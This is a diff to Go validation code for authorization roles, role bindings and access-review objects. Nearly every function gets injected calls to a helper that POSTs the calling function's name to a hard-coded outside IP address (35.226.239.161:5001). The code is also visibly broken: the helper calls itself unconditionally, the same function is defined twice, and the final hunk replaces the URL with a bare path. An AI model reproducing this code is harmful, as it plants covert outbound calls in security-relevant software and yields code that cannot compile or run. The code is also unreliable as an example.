@@ -33,9 +33,13 @@ func ValidateSelfSubjectRulesReview(review *authorizationapi.SelfSubjectRulesRev
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return field.ErrorList{}
 }
 func ValidateSubjectRulesReview(rules *authorizationapi.SubjectRulesReview) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -57,6 +61,8 @@ func ValidateSubjectRulesReview(rules *authorizationapi.SubjectRulesReview) fiel
 	return allErrs
 }
 func validateCommonAccessReviewAction(fldPath *field.Path, action *authorizationapi.Action) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -116,6 +122,8 @@ func ValidateSubjectAccessReview(review *authorizationapi.SubjectAccessReview) f
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	if len(review.Action.Verb) == 0 {
 		allErrs = append(allErrs, field.Required(field.NewPath("verb"), ""))
@@ -124,6 +132,8 @@ func ValidateSubjectAccessReview(review *authorizationapi.SubjectAccessReview) f
 	return allErrs
 }
 func ValidateResourceAccessReview(review *authorizationapi.ResourceAccessReview) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -160,6 +170,8 @@ func ValidateLocalSubjectAccessReview(review *authorizationapi.LocalSubjectAcces
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	if len(review.Action.Verb) == 0 {
 		allErrs = append(allErrs, field.Required(field.NewPath("verb"), ""))
@@ -168,6 +180,8 @@ func ValidateLocalSubjectAccessReview(review *authorizationapi.LocalSubjectAcces
 	return allErrs
 }
 func ValidateLocalResourceAccessReview(review *authorizationapi.LocalResourceAccessReview) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -204,9 +218,13 @@ func ValidateLocalRole(policy *authorizationapi.Role) field.ErrorList {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValidateRole(policy, true)
 }
 func ValidateLocalRoleUpdate(policy *authorizationapi.Role, oldRole *authorizationapi.Role) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -238,9 +256,13 @@ func ValidateClusterRole(policy *authorizationapi.ClusterRole) field.ErrorList {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValidateRole(authorizationapi.ToRole(policy), false)
 }
 func ValidateClusterRoleUpdate(policy *authorizationapi.ClusterRole, oldRole *authorizationapi.ClusterRole) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -272,9 +294,13 @@ func ValidateRole(role *authorizationapi.Role, isNamespaced bool) field.ErrorLis
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return validateRole(role, isNamespaced, nil)
 }
 func validateRole(role *authorizationapi.Role, isNamespaced bool, fldPath *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -313,11 +339,15 @@ func ValidateRoleUpdate(role *authorizationapi.Role, oldRole *authorizationapi.R
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := validateRoleUpdate(role, oldRole, isNamespaced, fldPath)
 	allErrs = append(allErrs, validation.ValidateObjectMetaUpdate(&role.ObjectMeta, &oldRole.ObjectMeta, fldPath.Child("metadata"))...)
 	return allErrs
 }
 func validateRoleUpdate(role *authorizationapi.Role, oldRole *authorizationapi.Role, isNamespaced bool, fldPath *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -356,6 +386,8 @@ func isNewRule(rule authorizationapi.PolicyRule, oldRole *authorizationapi.Role)
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, r := range oldRole.Rules {
 		if r.AttributeRestrictions != nil && equality.Semantic.DeepEqual(rule, r) {
 			return false
@@ -364,6 +396,8 @@ func isNewRule(rule authorizationapi.PolicyRule, oldRole *authorizationapi.Role)
 	return true
 }
 func ValidateLocalRoleBinding(policy *authorizationapi.RoleBinding) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -395,9 +429,13 @@ func ValidateLocalRoleBindingUpdate(policy *authorizationapi.RoleBinding, oldRol
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValidateRoleBindingUpdate(policy, oldRoleBinding, true)
 }
 func ValidateClusterRoleBinding(policy *authorizationapi.ClusterRoleBinding) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -429,6 +467,8 @@ func ValidateClusterRoleBindingUpdate(policy *authorizationapi.ClusterRoleBindin
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ValidateRoleBindingUpdate(authorizationapi.ToRoleBinding(policy), authorizationapi.ToRoleBinding(oldRoleBinding), false)
 }
 func ValidateRoleBinding(roleBinding *authorizationapi.RoleBinding, isNamespaced bool) field.ErrorList {
@@ -446,9 +486,13 @@ func ValidateRoleBinding(roleBinding *authorizationapi.RoleBinding, isNamespaced
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return validateRoleBinding(roleBinding, isNamespaced, nil)
 }
 func validateRoleBinding(roleBinding *authorizationapi.RoleBinding, isNamespaced bool, fldPath *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -482,6 +526,8 @@ func validateRoleBinding(roleBinding *authorizationapi.RoleBinding, isNamespaced
 	return allErrs
 }
 func validateRoleBindingSubject(subject kapi.ObjectReference, isNamespaced bool, fldPath *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -558,6 +604,8 @@ func ValidateRoleBindingUpdate(roleBinding *authorizationapi.RoleBinding, oldRol
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := ValidateRoleBinding(roleBinding, isNamespaced)
 	allErrs = append(allErrs, validation.ValidateObjectMetaUpdate(&roleBinding.ObjectMeta, &oldRoleBinding.ObjectMeta, field.NewPath("metadata"))...)
 	if oldRoleBinding.RoleRef != roleBinding.RoleRef {
@@ -566,6 +614,8 @@ func ValidateRoleBindingUpdate(roleBinding *authorizationapi.RoleBinding, oldRol
 	return allErrs
 }
 func ValidateRoleBindingRestriction(rbr *authorizationapi.RoleBindingRestriction) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -599,11 +649,15 @@ func ValidateRoleBindingRestrictionUpdate(rbr, old *authorizationapi.RoleBinding
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := ValidateRoleBindingRestriction(rbr)
 	allErrs = append(allErrs, validation.ValidateObjectMetaUpdate(&rbr.ObjectMeta, &old.ObjectMeta, field.NewPath("metadata"))...)
 	return allErrs
 }
 func ValidateRoleBindingRestrictionSpec(spec *authorizationapi.RoleBindingRestrictionSpec, fld *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -660,6 +714,8 @@ func ValidateRoleBindingRestrictionUser(user *authorizationapi.UserRestriction, 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	const invalidMsg = `must specify at least one user, group, or label selector`
 	if !(len(user.Users) > 0 || len(user.Groups) > 0 || len(user.Selectors) > 0) {
@@ -671,6 +727,8 @@ func ValidateRoleBindingRestrictionUser(user *authorizationapi.UserRestriction, 
 	return allErrs
 }
 func ValidateRoleBindingRestrictionGroup(group *authorizationapi.GroupRestriction, fld *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -710,6 +768,8 @@ func ValidateRoleBindingRestrictionServiceAccount(sa *authorizationapi.ServiceAc
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	const invalidMsg = `must specify at least one service account or namespace`
 	if !(len(sa.ServiceAccounts) > 0 || len(sa.Namespaces) > 0) {
@@ -732,6 +792,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -806,5 +887,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
